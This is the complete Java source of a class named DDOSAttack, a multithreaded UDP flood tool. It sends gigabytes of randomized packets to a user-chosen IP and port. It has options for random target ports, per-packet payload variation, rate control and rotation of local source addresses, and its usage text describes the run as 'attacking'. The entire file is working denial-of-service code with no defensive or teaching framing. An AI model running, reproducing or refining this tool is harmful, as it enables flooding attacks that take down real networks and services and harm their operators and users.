import java.io.*;
import java.net.*;
import java.nio.ByteBuffer;
import java.nio.channels.DatagramChannel;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.LongAdder;

public class DDOSAttack {

    // ---------- Shared statistics ----------
    private static final LongAdder totalSent = new LongAdder();
    private static final LongAdder totalBytes = new LongAdder();
    private static final LongAdder totalDropped = new LongAdder();
    private static volatile boolean stopFlag = false;

    // ---------- Per-error-class counters ----------
    private static final LongAdder errBind = new LongAdder();
    private static final LongAdder errPortUnreachable = new LongAdder();
    private static final LongAdder errIOException = new LongAdder();
    private static final LongAdder errOther = new LongAdder();

    // ---------- Recent error details (bounded) ----------
    private static final int ERR_HISTORY_MAX = 10;
    private static final Deque<String> recentErrors = new ConcurrentLinkedDeque<>();

    // ---------- Configuration ----------
    private static String targetIP;
    private static int targetPort;
    private static long totalPackets;
    private static int packetSize = 1490;
    private static int numThreads = 4;
    private static int burstSize = 50;
    private static double rateLimit = 0.0;
    private static int duration = 0;
    private static int srcPortBase = -1;
    private static boolean randomTargetPort = false;
    private static boolean bindLocal = false;
    private static boolean varyPayload = true;
    private static String logFile = null;
    private static int maxRetries = 3;

    private static PrintWriter logWriter = null;

    // ---------- Pre-allocated target addresses ----------
    private static InetSocketAddress[] portAddresses;

    // ---------- Local interface addresses (for --bind-local) ----------
    private static List<InetAddress> localAddresses = new ArrayList<>();

    // ===================================================================
    // Main
    // ===================================================================
    public static void main(String[] args) throws Exception {
        if (args.length == 0) {
            printUsage();
            System.exit(0);
        }
        parseArgs(args);

        if (logFile != null) {
            try {
                logWriter = new PrintWriter(new FileWriter(logFile, true));
            } catch (IOException e) {
                System.err.println("[!] Cannot open log file: " + e.getMessage());
            }
        }

        // Validate target
        try {
            InetAddress.getByName(targetIP);
        } catch (UnknownHostException e) {
            System.err.println("[!] Invalid target IP: " + targetIP);
            System.exit(1);
        }
        if (targetPort < 1 || targetPort > 65535) {
            System.err.println("[!] Port out of range: " + targetPort);
            System.exit(1);
        }
        if (packetSize < 64) packetSize = 64;
        if (packetSize > 65000) packetSize = 65000;
        if (totalPackets <= 0) {
            System.err.println("[!] Total packets must be > 0");
            System.exit(1);
        }

        // Pre-allocate target addresses for --random-port
        if (randomTargetPort) {
            portAddresses = new InetSocketAddress[65536];
            for (int i = 1; i <= 65535; i++) {
                portAddresses[i] = new InetSocketAddress(targetIP, i);
            }
        }

        // Enumerate local addresses for --bind-local
        if (bindLocal) {
            enumerateLocalAddresses();
            if (localAddresses.isEmpty()) {
                System.err.println("[!] No usable local addresses found, disabling --bind-local.");
                bindLocal = false;
            } else {
                System.out.printf("[+] --bind-local enabled, %d local addresses available.%n",
                        localAddresses.size());
            }
        }

        // Summary
        System.out.printf("[+] target=%s:%d  traffic=%.2fGB  packets=%d  threads=%d  size=%dB%s%s%n",
                targetIP, targetPort,
                (double) totalPackets * packetSize / (1024.0 * 1024 * 1024),
                totalPackets, numThreads, packetSize,
                randomTargetPort ? "  random-port" : "",
                varyPayload ? "  vary" : "");
        if (bindLocal) {
            System.out.println("[+] binding per-thread local source IP (Java cannot spoof source IP)");
        }
        System.out.println("[+] attacking... (Ctrl+C to stop)");

        Runtime.getRuntime().addShutdownHook(new Thread(() -> stopFlag = true));

        long startTime = System.currentTimeMillis();
        startAttack();
        long elapsed = System.currentTimeMillis() - startTime;

        // Final statistics
        long finalSent = totalSent.longValue();
        long finalBytes = totalBytes.longValue();
        long finalDropped = totalDropped.longValue();
        double rate = elapsed > 0 ? finalSent / (elapsed / 1000.0) : 0;

        System.out.printf("%n[=] done: %d pkts sent, %d dropped, %.4f GB, %.2fs, %.1f pps%n",
                finalSent, finalDropped, finalBytes / (1024.0 * 1024 * 1024),
                elapsed / 1000.0, rate);

        // Error breakdown
        System.out.printf("[=] errors: bind=%d  port-unreach=%d  io=%d  other=%d%n",
                errBind.longValue(), errPortUnreachable.longValue(),
                errIOException.longValue(), errOther.longValue());
        if (!recentErrors.isEmpty()) {
            System.out.println("[=] recent errors:");
            for (String e : recentErrors) {
                System.out.println("    " + e);
            }
        }

        if (logWriter != null) {
            logWriter.printf("done: sent=%d dropped=%d bytes=%d time=%.2fs rate=%.1fpps%n",
                    finalSent, finalDropped, finalBytes, elapsed / 1000.0, rate);
            logWriter.printf("errors: bind=%d port-unreach=%d io=%d other=%d%n",
                    errBind.longValue(), errPortUnreachable.longValue(),
                    errIOException.longValue(), errOther.longValue());
            logWriter.close();
        }
    }

    // ===================================================================
    // Help
    // ===================================================================
    private static void printUsage() {
        System.out.println("[+] Usage: java DDOSAttack -t <IP> -p <PORT> -g <GB> [options]");
        System.out.println();
        System.out.println("[+] Required:");
        System.out.println("  -t, --target        Target IP");
        System.out.println("  -p, --port          Target UDP port");
        System.out.println("  -g, --gb            Total traffic (GB)");
        System.out.println();
        System.out.println("[+] Optional:");
        System.out.println("  -P, --processes     Thread count (default 4)");
        System.out.println("  -b, --burst         Packets per burst (default 50)");
        System.out.println("  -r, --rate          Seconds per burst (default 0 = unlimited)");
        System.out.println("  -d, --duration      Duration in seconds (default 0 = until finished)");
        System.out.println("  -s, --src-port      Source port base (default -1 = random)");
        System.out.println("  --size              Base packet size (default 1490)");
        System.out.println("  --random-port       Randomize target port");
        System.out.println("  --bind-local        Bind each thread to a different local interface IP");
        System.out.println("                      (Java has no raw socket; true source-IP spoofing is impossible)");
        System.out.println("  --vary / --no-vary  Enable/disable payload variation (default: enabled)");
        System.out.println("  --log <file>        Log file path");
        System.out.println("  --max-retries       Max send retries per packet (default 3)");
        System.out.println("  -h, --help          Show this help");
        System.out.println();
        System.out.println("[+] Notes:");
        System.out.println("  * True source-IP spoofing requires raw sockets (C/Python+root), not available in pure Java.");
        System.out.println("  * --bind-local rotates through your machine's own interface IPs; effect is limited to multi-homed hosts.");
    }

    // ===================================================================
    // Argument parsing
    // ===================================================================
    private static void parseArgs(String[] args) {
        Map<String, String> params = new HashMap<>();
        for (int i = 0; i < args.length; i++) {
            if (args[i].startsWith("-")) {
                if (i + 1 < args.length && !args[i + 1].startsWith("-")) {
                    params.put(args[i], args[i + 1]);
                    i++;
                } else {
                    params.put(args[i], "true");
                }
            }
        }

        if (params.containsKey("-h") || params.containsKey("--help")) {
            printUsage();
            System.exit(0);
        }

        targetIP = params.getOrDefault("-t", params.get("--target"));
        if (targetIP == null) {
            System.err.println("[!] Missing -t/--target");
            System.exit(1);
        }

        String portStr = params.getOrDefault("-p", params.get("--port"));
        if (portStr == null) {
            System.err.println("[!] Missing -p/--port");
            System.exit(1);
        }
        targetPort = Integer.parseInt(portStr);

        String gbStr = params.getOrDefault("-g", params.get("--gb"));
        if (gbStr == null) {
            System.err.println("[!] Missing -g/--gb");
            System.exit(1);
        }
        double gb = Double.parseDouble(gbStr);

        if (params.containsKey("-P")) numThreads = Integer.parseInt(params.get("-P"));
        if (params.containsKey("-T")) numThreads = Integer.parseInt(params.get("-T"));
        if (params.containsKey("-b")) burstSize = Integer.parseInt(params.get("-b"));
        if (params.containsKey("-r")) rateLimit = Double.parseDouble(params.get("-r"));
        if (params.containsKey("-d")) duration = Integer.parseInt(params.get("-d"));
        if (params.containsKey("-s")) srcPortBase = Integer.parseInt(params.get("-s"));
        if (params.containsKey("--size")) packetSize = Integer.parseInt(params.get("--size"));
        if (params.containsKey("--random-port")) randomTargetPort = true;
        if (params.containsKey("--bind-local")) bindLocal = true;
        if (params.containsKey("--no-vary")) varyPayload = false;
        if (params.containsKey("--vary")) varyPayload = true;
        if (params.containsKey("--log")) logFile = params.get("--log");
        if (params.containsKey("--max-retries")) maxRetries = Integer.parseInt(params.get("--max-retries"));

        if (gb <= 0) {
            System.err.println("[!] GB must be > 0");
            System.exit(1);
        }
        totalPackets = (long) (gb * 1024 * 1024 * 1024 / packetSize);
        if (totalPackets <= 0) {
            System.err.println("[!] Traffic too small");
            System.exit(1);
        }
    }

    // ===================================================================
    // Local address enumeration (for --bind-local)
    // ===================================================================
    private static void enumerateLocalAddresses() {
        try {
            Enumeration<NetworkInterface> ifaces = NetworkInterface.getNetworkInterfaces();
            if (ifaces == null) return;
            for (NetworkInterface iface : Collections.list(ifaces)) {
                if (!iface.isUp() || iface.isLoopback()) continue;
                for (InterfaceAddress ia : iface.getInterfaceAddresses()) {
                    InetAddress addr = ia.getAddress();
                    if (addr instanceof Inet4Address) {
                        localAddresses.add(addr);
                    }
                }
            }
        } catch (SocketException e) {
            System.err.println("[!] Failed to enumerate interfaces: " + e.getMessage());
        }
    }

    // ===================================================================
    // Variant payload generator
    // ===================================================================
    /**
     * Generates a batch of variant payloads:
     *   - lengths vary in [baseSize - delta, baseSize + delta]
     *   - content is random
     *   - first 8 bytes will be overwritten per-packet with the packet counter
     */
    private static List<byte[]> buildVariantPool(int baseSize, int poolSize) {
        if (!varyPayload) {
            byte[] one = new byte[baseSize];
            new Random().nextBytes(one);
            List<byte[]> single = new ArrayList<>(1);
            single.add(one);
            return single;
        }
        Random rnd = new Random();
        int delta = Math.max(1, baseSize / 10); // ±10% length variation
        List<byte[]> pool = new ArrayList<>(poolSize);
        for (int i = 0; i < poolSize; i++) {
            int len = baseSize - delta + rnd.nextInt(delta * 2 + 1);
            if (len < 64) len = 64;
            if (len > 65000) len = 65000;
            byte[] p = new byte[len];
            rnd.nextBytes(p);
            pool.add(p);
        }
        return pool;
    }

    // ===================================================================
    // Send with retry (errors classified)
    // ===================================================================
    private static boolean sendWithRetry(DatagramChannel channel, byte[] payload,
                                         SocketAddress target, int maxRetries,
                                         String threadTag) {
        ByteBuffer buffer = ByteBuffer.wrap(payload);
        int attempts = 0;
        while (attempts < maxRetries) {
            try {
                buffer.clear();
                int written = channel.send(buffer, target);
                if (written > 0) return true;
            } catch (PortUnreachableException e) {
                errPortUnreachable.increment();
                recordError(threadTag + ": port unreachable (" + target + ")");
            } catch (IOException e) {
                errIOException.increment();
                recordError(threadTag + ": IOException (" + e.getMessage() + ")");
            } catch (Exception e) {
                errOther.increment();
                recordError(threadTag + ": " + e.getClass().getSimpleName() + " (" + e.getMessage() + ")");
            }
            attempts++;
        }
        return false;
    }

    private static void recordError(String msg) {
        recentErrors.addLast(msg);
        while (recentErrors.size() > ERR_HISTORY_MAX) {
            recentErrors.pollFirst();
        }
    }

    // ===================================================================
    // Attack body
    // ===================================================================
    private static void startAttack() throws Exception {
        ExecutorService executor = Executors.newFixedThreadPool(numThreads);
        List<Future<?>> futures = new ArrayList<>();
        long packetsPerThread = totalPackets / numThreads;
        long extra = totalPackets % numThreads;

        final int variantPoolSize = 256;

        for (int i = 0; i < numThreads; i++) {
            long pktCount = packetsPerThread + (i < extra ? 1 : 0);
            int threadId = i;
            Runnable task = () -> {
                String tag = "T" + threadId;
                ThreadLocalRandom rnd = ThreadLocalRandom.current();
                List<byte[]> variantPool = buildVariantPool(packetSize, variantPoolSize);

                DatagramChannel channel = null;
                try {
                    channel = openChannelForThread(threadId);

                    // Determine per-thread target port if random mode is not used
                    // (in non-random mode all threads hit the same port)
                    InetSocketAddress dest = new InetSocketAddress(targetIP, targetPort);

                    long sent = 0, bytesSent = 0, dropped = 0;
                    long packetCounter = 0;

                    // Rate control via monotonic accumulation
                    final long burstPeriodNs = rateLimit > 0
                            ? (long) (rateLimit * 1_000_000_000L) : 0L;
                    long nextTick = System.nanoTime();

                    while (!stopFlag && sent < pktCount) {

                        int toSend = (int) Math.min(burstSize, pktCount - sent);

                        for (int j = 0; j < toSend; j++) {
                            if (stopFlag || sent >= pktCount) break;

                            // --- Variant payload selection ---
                            byte[] payload = variantPool.get(
                                    (int) (packetCounter % variantPool.size()));
                            // Overwrite first 8 bytes with packet counter so
                            // every packet is unique even if pool content repeats
                            long tagBytes = packetCounter;
                            for (int b = 0; b < 8 && b < payload.length; b++) {
                                payload[payload.length - 1 - b] = (byte) (tagBytes & 0xFF);
                                tagBytes >>>= 8;
                            }
                            packetCounter++;

                            // --- Target address ---
                            InetSocketAddress targetAddr;
                            if (randomTargetPort) {
                                int port = rnd.nextInt(1, 65536);
                                targetAddr = portAddresses[port];
                            } else {
                                targetAddr = dest;
                            }

                            // --- Send ---
                            if (sendWithRetry(channel, payload, targetAddr, maxRetries, tag)) {
                                sent++;
                                bytesSent += payload.length;
                            } else {
                                dropped++;
                                // Rebuild channel if it seems broken
                                try {
                                    if (channel != null && !channel.isOpen()) {
                                        channel = openChannelForThread(threadId);
                                    }
                                } catch (Exception ignore) { }
                            }
                        }

                        // --- Incremental global update ---
                        if (sent > 0) {
                            totalSent.add(sent);
                            totalBytes.add(bytesSent);
                            totalDropped.add(dropped);
                            sent = 0;
                            bytesSent = 0;
                            dropped = 0;
                        }

                        // --- Rate control with drift compensation ---
                        if (burstPeriodNs > 0) {
                            nextTick += burstPeriodNs;
                            long now = System.nanoTime();
                            long sleepNs = nextTick - now;
                            if (sleepNs > 0) {
                                try {
                                    TimeUnit.NANOSECONDS.sleep(sleepNs);
                                } catch (InterruptedException ignored) { }
                            } else {
                                // Behind schedule — reset tick to "now" to avoid burst catch-up storm
                                nextTick = now;
                            }
                        }
                    }

                } catch (Exception e) {
                    errOther.increment();
                    recordError(tag + " fatal: " + e.getClass().getSimpleName()
                            + " (" + e.getMessage() + ")");
                } finally {
                    if (channel != null) {
                        try { channel.close(); } catch (IOException ignored) { }
                    }
                }
            };
            futures.add(executor.submit(task));
        }

        // ---------- Progress monitor ----------
        long start = System.currentTimeMillis();
        long lastReportTime = start;
        long lastReportSent = 0;

        while (!stopFlag) {
            long now = System.currentTimeMillis();
            long elapsed = now - start;
            long sent = totalSent.longValue();
            long bytes = totalBytes.longValue();
            long dropped = totalDropped.longValue();

            if (sent >= totalPackets) break;

            if (duration > 0 && elapsed / 1000 >= duration) {
                stopFlag = true;
                break;
            }

            if (now - lastReportTime >= 1000) {
                long deltaSent = sent - lastReportSent;
                double deltaTime = (now - lastReportTime) / 1000.0;
                double instantRate = deltaSent / deltaTime;
                double rate = elapsed > 0 ? sent / (elapsed / 1000.0) : 0;
                double dataGB = bytes / (1024.0 * 1024 * 1024);
                System.out.printf("[+] sent=%d  data=%.4fGB  rate=%.0fpps  inst=%.0fpps  drop=%d%n",
                        sent, dataGB, rate, instantRate, dropped);
                if (logWriter != null) {
                    logWriter.printf("sent=%d data=%.4fGB rate=%.0fpps drop=%d%n",
                            sent, dataGB, rate, dropped);
                    logWriter.flush();
                }
                lastReportTime = now;
                lastReportSent = sent;
            }

            Thread.sleep(100);
        }

        stopFlag = true;
        for (Future<?> f : futures) {
            try { f.get(); } catch (Exception ignored) { }
        }

        executor.shutdown();
        try {
            if (!executor.awaitTermination(5, TimeUnit.SECONDS)) {
                executor.shutdownNow();
            }
        } catch (InterruptedException e) {
            executor.shutdownNow();
        }
    }

    // ===================================================================
    // Open a DatagramChannel for a given thread
    //   - Optionally binds to a distinct local interface address (--bind-local)
    //   - Optionally binds to srcPortBase + threadId (for source-port pinning)
    //   - SO_REUSEADDR enabled to reduce bind conflicts
    // ===================================================================
    private static DatagramChannel openChannelForThread(int threadId) throws IOException {
        DatagramChannel channel = DatagramChannel.open();
        channel.configureBlocking(true);

        DatagramSocket socket = channel.socket();
        try {
            socket.setReuseAddress(true);
        } catch (SocketException ignored) { }

        InetAddress bindAddr = null;
        int bindPort = 0;

        if (bindLocal && !localAddresses.isEmpty()) {
            bindAddr = localAddresses.get(threadId % localAddresses.size());
        }
        if (srcPortBase >= 0) {
            bindPort = srcPortBase + threadId;
        }

        if (bindAddr != null || bindPort > 0) {
            try {
                socket.bind(new InetSocketAddress(
                        bindAddr != null ? bindAddr : InetAddress.getByName("0.0.0.0"),
                        bindPort));
            } catch (BindException e) {
                errBind.increment();
                recordError("T" + threadId + ": bind failed ("
                        + (bindAddr != null ? bindAddr : "0.0.0.0") + ":" + bindPort
                        + "), using system-assigned");
                // fall through — system will pick a random port
            }
        }

        return channel;
    }
}
